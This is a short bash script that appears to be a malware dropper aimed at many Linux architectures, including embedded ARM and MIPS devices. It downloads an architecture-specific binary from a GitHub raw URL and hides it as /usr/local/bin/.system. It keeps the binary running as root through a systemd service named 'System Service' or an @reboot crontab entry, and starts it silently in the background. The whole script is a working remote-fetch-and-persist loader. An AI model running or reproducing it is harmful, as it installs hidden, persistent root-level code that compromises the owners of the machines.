#!/bin/bash

# Detect architecture
ARCH=$(uname -m)

# Map architecture to binary names (assuming binaries are named like ${ARCH})
case "$ARCH" in
    armv5l) BINARY="armv5l" ;;
    armv6l) BINARY="armv6l" ;;
    armv7l) BINARY="armv7l" ;;  # Assuming armv7/ means armv7l
    armv8l|aarch64) BINARY="armv8l" ;;  # armv8l often maps to aarch64
    mips) BINARY="mips" ;;
    mips64) BINARY="mips64" ;;
    mips64le) BINARY="mips64le" ;;
    mipsel) BINARY="mipsel" ;;
    ppc64) BINARY="ppc64" ;;
    ppc64le) BINARY="ppc64le" ;;
    riscv64) BINARY="riscv64" ;;
    s390x) BINARY="s390x" ;;
    i386|i686) BINARY="x86" ;;
    x86_64) BINARY="x86_64" ;;
    *) echo "Unsupported architecture: $ARCH"; exit 1 ;;
esac

# Download the binary (assuming hosted on GitHub raw or similar; replace REPO_URL with actual)
REPO_URL="https://raw.githubusercontent.com/Tiancaizhi9098/Gostres/main/binaries"  # Placeholder; update with real URL
curl -L -o /tmp/system "$REPO_URL/$BINARY"

# Make executable
chmod +x /tmp/system

# Rename to 'system' and move to a hidden/system-like location (e.g., /usr/local/bin/.system to hide)
mv /tmp/system /usr/local/bin/.system

# Set up autorun on boot (using systemd for modern Linux; fallback to crontab if needed)
if command -v systemctl >/dev/null; then
    # Create a systemd service
    cat <<EOF > /etc/systemd/system/system.service
[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=/usr/local/bin/.system
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable system.service
    systemctl start system.service
else
    # Fallback to crontab
    (crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/.system &") | crontab -
fi

# Run in background immediately
nohup /usr/local/bin/.system >/dev/null 2>&1 &

echo "Installation complete. Running in background."
